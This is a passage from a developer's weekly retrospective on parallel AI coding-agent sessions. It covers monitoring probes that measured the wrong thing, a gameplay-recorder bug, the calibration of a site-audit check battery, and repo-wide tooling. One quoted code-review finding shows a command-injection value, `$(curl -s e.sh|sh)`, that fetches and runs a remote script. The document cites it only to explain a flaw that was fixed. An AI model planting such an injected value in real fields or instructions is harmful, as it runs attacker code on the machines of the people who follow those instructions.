> hidden `cf-turnstile-response` input. Nothing writes `data-sitekey`,
> `page.route` or `addInitScript`. **The real widget renders with the real key
> on every nightly run**, against 6 sites' live contact forms. The code's own
> comment at :501 already said so. **The probe is generating the evidence and
> discarding it.**"_

And the second overstatement: _"'a green smoke run rules out the wrong-hostname
state' is FALSE for the fleet. fleet-smoke is clone-based… `PUBLIC_TURNSTILE_SITE_KEY`
is a Netlify variable and is not in the clone, so TurnstileWidget renders
nothing and no TurnstileError is ever thrown. The guard is correct and inert
here."_

The net statement is the honest one and now sits in the runbook: _"**nothing
automated observes a production Turnstile widget on its production hostname.**
/health sees an env var, the smoke suite sees a keyless local build, form-e2e
sees the real widget and ignores it."_

**#695 — the verdict moves to the only thing that can earn it.** form-e2e now
writes the Turnstile column, with a five-state mapping and three load-bearing
constraints each pinned by a test. The one to carry forward: **the cron order
forced the move.** function-health runs 08:00, the digest reads 09:23, form-e2e
writes 10:15 — _"with both writing, function-health's null would clear every
browser verdict each morning before the red alarm ever saw one."_ And: **absent
is not null.** A run with no opinion omits the key; only a run that looked and
could not tell clears the cell. _"Collapsing them lets a probe that cannot see
Turnstile erase a real verdict — caught by the existing suite when the first
draft did exactly that."_

Four PRs in under nine hours, two of them corrections of the previous one, on a
single boolean column. That is what it costs to establish what one instrument
actually measures.

### 12. Broken — the recorder was pointed at nothing (Thu 09-03 → Sat 09-05)

This is a personal Godot project, and it is in this chapter because the same
failure mode appeared here, in a completely different stack, in the same week,
and was handled better than in the fleet.

**The transport.** Gameplay "tapes" were being posted through Netlify Forms.
Tucker, Sep 4: _"to be honest, this solution seems pretty fragile, and won't
survive other builds and using this off of netlify, let's reconsider and find a
different way to do reporting."_ The commit that replaced it opens by quoting
him and conceding the point:

> _"Netlify Forms lasted one day and lost at least four tapes. The defect is not
> a bug, it is the transport: **Netlify answers 200 to submissions it does not
> keep**, so no reading of the response distinguishes delivery from silence.
> Proved on one machine inside one minute."_

The replacement is a Cloudflare Worker returning `{"ok":true,"id":N}` — _"the
id is the design: a thing that exists and can be quoted, instead of a status
code meaning 'something answered'."_ The old path was deleted rather than kept
as a fallback: _"a silent path beside a working one means trusting neither."_

**Tucker forced a review before the deploy** — _"please do a full review of the
tape sink code AND logic before you do that, and when we're doing a full feature
like this in future we need to go throught the Design, Spec, and Plan steps
before we build things please."_ The review ran six reviewers with every finding
handed to a separate agent told to refute it: **35 raised, 19 refuted, 16
confirmed**, in code written the same evening and one command from deploy. The
worst finding:

> _"The KV key was built from the caller's own room and run strings… so a tape
> posted with a room of `$(curl -s e.sh|sh)` stored itself under that key, and
> this service's own README tells a person to copy a key out of `kv key list`
> and paste it into `kv key get`. **A command injection into my own
> instructions.**"_

And a delivery lie: _"The sink returns a STRING id; the panel ran it through
`int()` and printed `%d`, and Godot's `to_int()` keeps every digit rather than
stopping at the first non-digit, so a real key printed as #2026090412131432 and
fetched nothing — **delivery true, proof fiction.**"_

**Then the instrument itself.** Replaying the three tapes Tucker had sent found
that two carried **no position checkpoints at all**:

> _"CellRunPanel armed the recorder from its own `_ready` with
> `Tape.watch(_room.wrench)`, and a single room builds its wrench in ITS
> `_ready` — Godot readies children before parents, so the panel asked first and
> was handed null every time. **Nothing complains**: `watch(null)` is legal,
> `sample` skips the checkpoint branch, and the tape records, sends and replays
> exactly as before while carrying nothing a replay can be checked against."_

And the reason the suite could not catch it is the reusable part: _"every check
in tapeSmoke arms the recorder by hand on the line after building the room,
exercising a path the game does not take."_ The new check asks it of the real
scenes: **0 checkpoints in 65 ticks before the fix, 3 after.**

**Tucker then set the priority explicitly**, which is the sentence that should
travel furthest out of this week:

> _"C and A, getting this right should be our first priority, getting all the
> movement and physics right has to come before we build anything else, and
> **getting correct feedback on the physics is how we get physics and movement
> right**."_

The commit titles that follow are a compressed lesson in proving an instrument:
`Task 4: one command, and it found two bugs immediately` · `Tasks 5 and 6: a
browser in the loop, and it disagrees with me` · **`Task 7: the harness's first
act was to refute the reason it was built`**.

That last one measured cross-runtime drift at **0.16 px, not the 16.7 px the
design had been built around** — _"the two runtimes agree with each other to a
seventh of a px while both disagree with his run by sixteen — so whatever is
wrong with that replay is not the runtime, because both runtimes are wrong
about it identically."_ The cause was the build, which a pre-v3 tape cannot
name.

Two more corrections followed, in opposite directions, within 24 hours. The
recorder's clock had been counting **frozen** frames — _"the boot card pauses
the whole tree until the first tap, so a tape's opening ticks were spent frozen
while the counter went on, and a replay simulated them for real — 229.78 px and
a move that never happened."_ Proved without a phone: the same scripted run
recorded behind a 0-tick and a 55-tick freeze produces **byte-identical files**.
Then a real phone tape against the fixed build read **0.07 px over 6,060 ticks /
101 seconds, 38/38 events, EXACT** — where the same room on the previous build
read 229.38 px. And that same tape **overturned the previous day's correction**:
phone-browser → browser replay 0.07 px EXACT, phone-browser → native replay
**545.44 px, 29/38 MISSING**, traced to _"a contact landing 64 ticks late at
tick 1307 — 21 seconds in, past where the 15-second pair stopped looking."_

The note left in that commit is the most disciplined sentence in the corpus this
week: _"the note left there yesterday — that reversing an agreed spec on my own
measurement is the move this project made a rule against — is why there was
nothing to undo."_

### 13. Calibrating the battery against sites nobody controls (Thu 09-03 → Sat 09-05)

Tucker's ask on Sep 3 was volume: _"can we brainstorm some more 'does it work?'
tests?… more tests read as more value, even if they're trivial, getting up to
100 tests would be great… check that there's a favicon, check that there's a
sitemap, click some buttons, etc. give me a list starting with the easiest
adds… tests should be in order of how much effort/cost to implement."_

The agent pushed back with a rule, and Tucker took it: **greenability** — _"a
check no ordinary good site can pass is measuring fashion, not care; a check
everything passes is padding unless it folds into 'What Passes'."_ Later
sharpened to _"being correct is not sufficient grounds to occupy a row."_ Of
119 candidate checks, **94 survived**, graded KEEP/REWORD/COND/MOVED/CUT in a
447-line spec. Four check states were introduced — `pass` / `fail` /
`unmeasured` (our gap) / `not-applicable` — with only pass+fail in the
denominator, on the founding constraint _"never report our missing measurement
as their defect."_

Admin-path probing was cut on Tucker's agreement because _"it reads as
reconnaissance against a stranger's site."_

**Then the calibration, which is the good part.** Tucker: _"we're going to run
these all against our own site and other 'good' sites to make sure they pass
once the battery is set up."_ The sequence and his reactions:

- _"great, let's validate against reddoor"_ — run against reddoorla.com.
- _"76 checks 53/67 passing doesn't scan, what's going on there"_ — he caught
  the arithmetic before reading a single finding. (INFERRED, but strongly
  supported by the four-state design: 76 defined, 67 in the denominator, the
  other 9 `unmeasured`/`not-applicable`.)
- _"did you fix the flake bug?"_ — demanding proof, not assurance, on an
  intermittent crawl hang.
- _"alright, see if this runs on apple.com"_ — a deliberately known-good
  control.
- _"cut noopener, talk to me about the checks apple failed in more detail and
  see if you can justify keeping them in the suite."_
- _"would any of these provide actual value to apple to know? **I suspect these
  things would've been flagged if they were a real issue with the budget behind
  that site**."_
- _"do you have another site you'd want to look at as 'known good' to
  calibrate?"_ → viget.com.
- And on a check he was not convinced by: _"i think that most sites are going to
  have this issue and I'd need you to have strong evidence that it's an actual
  problem worth flagging."_

This is the house rule inverted and used as a design tool: rather than prove a
gate passes on a known-good input _before_ trusting a fail, the battery was
**built against known-good inputs from the start**, and every check that fired
on Apple or Viget had to justify its existence or be cut.

**One safety catch was Tucker's alone.** The Tier 4 probe submits an empty form
and an invalid-email form to a prospect's live contact form. Running a
calibration corpus therefore sprays two junk submissions at every site in it.
Tucker, Sep 5: _"add the probe forms false switch and use it, we don't need to
be sending off a load of chaff to potential clients."_ Nothing in the harness
had raised this; the tier-4 check that submits a _real_ valid enquiry
(`T4-15`) remained explicitly gated and undecided all week.

### 14. The journal opens, CLAUDE.md comes back into version control, and a fleet sweep hits a wall for the third time (Sat 09-05)

Three things landed together and the ordering is the story.

**11:10–13:33 — the sweep.** Tucker's instruction (_"I want every repo to
maintain a workJournal"_) fanned out to **38 repos**, each getting an adopt
commit plus a follow-up (`docs: a corrected entry needs a pointer from where
the reader lands`). Measured outcomes: **35 repos merged a PR; 4 did not.**
`reddoor-mailer`, `the-pointe`, `rfp-analyze` and `a-budget` still sit on
`chore/work-journal` branches a week later (`repos.jsonl`, snapshot
2026-09-12) — the first three are the known un-pushable set (two archived, one
with no `origin`). The sweep also **redded CI in two repos** (`canvas-starter`,
`the-tower-burbank`) on a documentation-only change, because `prettier --check`
covers markdown; canvas-starter needed a third commit, `docs: format the journal
so prettier --check passes`.

**14:35 — CLAUDE.md is tracked (#699), reversing a standing decision.** It had
been excluded in `.git/info/exclude` because the repo is public and the file
names where the Discord bot token lives, the guild id, and which members of a
client channel are staff versus client. _"A rollout session stopped rather than
commit it today, which was the right call to make without asking."_ Tucker's
ruling, from the vida session: _"bring the reddoor main CLAUDE back into version
control and add it, this si a decision."_ The reasoning, as recorded: **none of
it is a credential value** — _"the token line says where the secret lives, not
what it is"_ — and the one genuinely confidential line goes public knowingly.
The argument for doing it is the same as the argument for the journal:
_"The standing rules for the most complex repo in the fleet existed on exactly
one machine — not reviewable, not diffable, absent from any fresh clone, and
one `rm -rf` from gone."_

The journal's first entry is an explicit backfill and says so in its own first
paragraph — _"Detail below this line is trustworthy; detail above it is not"_ —
and it records one mistake the session made that day: a
`git checkout main && git pull` in the main checkout where **the checkout failed
silently** (main was already checked out in another worktree) _"but the `&&`
chain still reached `git pull`, which merged `origin/main` into
`feat/audit-check-battery` and left a merge commit on another session's WIP
branch."_ It was not undone, because by the time it was noticed the other
session had committed on top. _"This is exactly the collision CLAUDE.md's 'never
commit from the main checkout' rule exists to prevent, and it happened by
treating a shared checkout as a place to run a quick read-only command."_

**14:56 — `fleet-repos.sh` (#701), written after the wall was hit.** _"Third
occurrence of the same failure."_ The mechanism is now stated plainly enough to
be memorable: _"archived is invisible from inside a clone. `git remote -v` shows
an ordinary URL, `git ls-remote` succeeds, `git fetch` succeeds; only the push
fails, and only after every commit already exists."_ It also got reported wrongly
that same day — a session told Tucker two repos had "dead remotes", which is a
different problem with a different answer. Implementation notes worth keeping:
**one `gh repo list` per owner, not one `gh repo view` per repo — 3 API calls
instead of 39, 3.9s instead of ~40s**, _"the difference between running it every
time and not bothering"_; and written for **bash 3.2**, because the first draft
used associative arrays and _"died on `declare: -A: invalid option`"_ on the
operator's own machine. One incidental finding: the checkout
`welcome-to-the-flower-court` is `tucksravin/invitations`, so the script maps by
remote, not directory name.

**Two sessions hit the same wall the same afternoon, independently.** At
**14:32 local — 24 minutes before #701 merged** — Tucker wrote, in the _vida_
session (not the maintenance one that was building the script): _"i feel like
you consistently get hung up on archived repos, is there a way we can fix
that?"_ So the fix was in flight in one repo while the same failure was being
re-encountered in another, with no shared signal between them. A script in
`reddoor-maintenance/scripts/` is not knowledge in a site repo's session; the
thing that closes that gap is the machine-global `CLAUDE.md` entry, which is a
separate artefact with a separate landing time. **The tooling and the standing
instruction that makes any session reach for it are two different deliverables,
and only shipping both closes the loop.**

### 15. Welcome to the Flower Court — one ask to a live site in two hours, shipped the same day (Sat 09-05 → Sun 09-06)

At 10:57 local: _"I want to build an app using the reddoor stack that let's me
send invitations for storygames, murder mystery parties, and other things that I
run, custom themes each time… Let's make a plan to do this, take whatever time
you need and ask me any questions you have."_

The morning's design was a real product: Turso, per-guest HMAC links, a typed
field kit, a theme engine, an admin authoring UI — _a two-week build_. Then at
12:20: _"how would scope if I want to send out invites by end of day today?
doesn't need to be reusable, we can rebuild into a bigger project with the
lessons we learn building this."_ And shortly after, Turso was cut entirely in
favour of emailing the responses.

**The site was live at `invitations.tuckerlemos.com` at 12:53** — 1h59m from
the first message. The journal's governing rule: _"cut the abstractions, keep
the mechanisms — the abstractions designed against a single event are guesses,
and they are exactly what a second event would force you to redesign."_

Three beliefs corrected on contact, all of them about _time_:

- _"'Email is the risky part; cut it to protect the deadline.' Wrong, and it
  reversed completely… `reddoorla.com` is already verified in the existing
  Resend account. **Check what is already verified before pricing a DNS
  round-trip into a deadline.**"_
- _"'The custom domain will be the slow step.' It was instant."_ Wildcard DNS
  already pointed at Netlify; the Hover account was never touched.
- _"'Turso sharing the fleet group is urgent.' I called this urgent and it was
  overcalibrated."_

**And the best design outcome came from the constraint, not despite it.** With
no database there is no way to show which playbooks are taken, so two guests
could both claim the Prinxarch. Rather than build a race that cannot be
arbitrated, the form asks for a **ranked top three plus an opt-out list** —
which Tucker then confirmed is how he already casts. _"The no-database version
of this feature is not a degraded version, it is the correct one."_

A privacy problem was likewise solved by reading rather than engineering: the
secret objective, the one genuinely sensitive field, was removed from the invite
entirely because _The Flower Court_'s own text has players fill their sheet in
at the table.

**What tests did not catch.** The journal is blunt: _"Everything below passed
`svelte-check`, built clean, and passed axe. They were found only by
screenshotting the deployed page at 390px and looking at it."_ The corner bloom
sat on top of the first letter of every alternating playbook card — "Contex"
rendered as "ontex" — because the mockup mirrored the bloom to follow the
notched corner, _"which works when the card is a design comp and breaks the
moment a real heading occupies that box."_

**Then it was rebuilt the same afternoon.** At 14:00 Tucker asked to gussie up
the form and make it _"swipe/page based rather than just vertical scroll"_; a
spec and plan were written at 14:30/14:37, and the paged invitation landed
through nine tracked tasks by 17:34. The vertical scroll-snap was then **added,
removed and re-added** the same day — `feat: vertical scroll-snap spine` (15:54)
→ `feat: drop the vertical scroll-snap; the document scrolls again` (17:42) →
_"ok i want to try snap scroll again, breaking up content into more screens and
setting it to always be svh"_ → `feat: the snap spine returns — 21 screens, each
exactly one viewport` (20:41). Tailwind v4 was added at 19:21, _after_ the site
was already written by hand. This is the cheapest observable instance in the
corpus of the operator using a live site as the design surface — three round
trips on one mechanism, each about 90 minutes, all on his own project where the
cost is his alone.

Sunday was physical production: twelve sigils as papercut data, SVG paths
flattened to polylines, _"cells minus bridges as polygons; the stencil rule as a
test"_, cut files sized for a Cricut, dossier and name-slip PDFs, and twelve
emails sent. Notable operator note mid-stream: _"the svg all is way too big for
the cricut"_ — a physical constraint that no gate in the repo could have
expressed.

### 16. The smaller threads

**gallerysonder — the operator's voice is not the agent's to write.** A long
client thread about GTM access and a Salesforce integration produced the
clearest register correction of the week. After the agent returned a full
pastable email, Tucker: _"sorry, I'm not going to use your whole pastable
response, that's clearly not how I write, compress it down to one sentence that
I can rewrite in my voice."_ And then, generalising it: _"**overall note, I like
to have the data and write my own emails, when I paste one in, I'm asking for
feedback and not a rewrite.**"_ He also corrected the agent's model of the
_purpose_ of a sentence: _"I'm naming our stuff do give him a graceful way to
realize he's wrong."_ The pattern across the thread is consistent — he wants
facts checked (_"anything incorrect in my reply?"_, asked three times over
successive drafts), not prose produced.

**revogen — pixels are part of the promise.** After a Rive fallback fix:
_"the fallbacks we added are visible behind the rives, please fix and make sure
to check in future that the pixels don't change if you promise a change of this
nature."_ The fix (`render the fallback still only after a Rive load error`) is
one line of intent; the instruction behind it is a standing one about what
counts as verifying a visual change.

**the-bench (Fri 09-04).** _"new feature time, but before that let's do some
organizing. I want this to be part of a monorepo that has the context for all my
workshop projects, call it 'the-bench.' plan this migration and ask me any
questions you need."_ Spec → plan (12 tasks, board gates before deletion) →
execution, with one commit explicitly re-baselining the verification gates _"at
migration start, not at spec time"_ — i.e. the gate's reference point was
recognised as stale before it was trusted.

**scriptorium-setup (Sun 09-06).** A pure-friction thread: _"i switched wifi, it
worked on the new one, but I can't push from my home wifi even though it says
it's connected"_, then _"ahead 2 behind one i don't know if I can push, can you
handle it over ssh?"_ Resolved via `superpowers:systematic-debugging`, and the
resulting commits are the right shape: `fix: ship names a rejected push, and
[w] proves there is a route out`. A tool that failed silently now names its
failure.

**caldea (Wed 09-02 → Sat 09-05).** Novel work, plus one piece of workflow
tooling that is genuinely relevant to this retrospective. Tucker, running many
sessions at once: _"is there a way to color the top bar differently for
different vscord windows? when I'm running a bunch of them I sometimes ask the
wrong message in the wrong chat like that?"_ This was not hypothetical — on Aug
31 he had written into the wrong session and had to stop it: _"wait are you
working on sonder or broken right now?"_ … _"yes please stop i have a parallel
agent in broken."_ The fix went through four iterations of taste (_"ok this is a
little much, can we just do the top?"_ → _"what does just the activity bar look
like?"_ → _"bring all the colors 60% of the way to the atom dark color"_ →
_"push those colors ~20% closer to the bg atom color, this is a hint not a
primary ui element"_) and ended on the status bar, with a per-repo hex palette
tracked in the starter. **A misrouted prompt is a real failure mode of the
parallel-session workflow, and the countermeasure that shipped is a colour.**

---

## WHAT THIS WEEK SAYS ABOUT THE WORKFLOW

**The recurring defect has a single shape, and it was named three times
independently.** "A green granted on the absence of an error string rather than
on evidence of health" (VLF). "A truthiness check on a string that never
contacts Cloudflare" (Turnstile). "`watch(null)` is legal, `sample` skips the
checkpoint branch, and the tape records, sends and replays exactly as before
while carrying nothing a replay can be checked against" (Broken). Three stacks,
three teams-of-one, same week, same shape. The fleet's `CLAUDE.md` rule — prove
the instrument on a known-good input before trusting a fail — covers the
_failing_ direction. **Every incident this week was in the other direction: an
instrument that had only ever passed.** The rule needs its mirror.

**Corrections propagate at the speed of the slowest artefact.** The
`a11yRoutes` gap was correctly diagnosed on day three and fixed on day five,
because it was written into prose rather than into a tracker. The archived-repo
script shipped at 14:56 and a sibling session hit the same wall at 14:32 that
afternoon. The retrospective's own fact-checker reasoned from the retrospective
text in its prompt instead of opening the file. In all three cases the correct
information existed and did not reach the place it was needed.

**The operator is the reconciliation layer, and he is running seven of them at
once.** The corpus shows six to nine concurrent sessions most days, with Tucker
supplying cross-session state by hand (_"check reddoor maint for credentials"_,
_"check discord for notes from erik and nicole"_, _"check my email"_), catching
arithmetic that does not scan, catching a killed metric reasserting itself,
catching a probe about to spray junk submissions at prospects, and catching his
own prompts landing in the wrong window. **Almost every high-value correction
this week originated with him, not with a gate.**
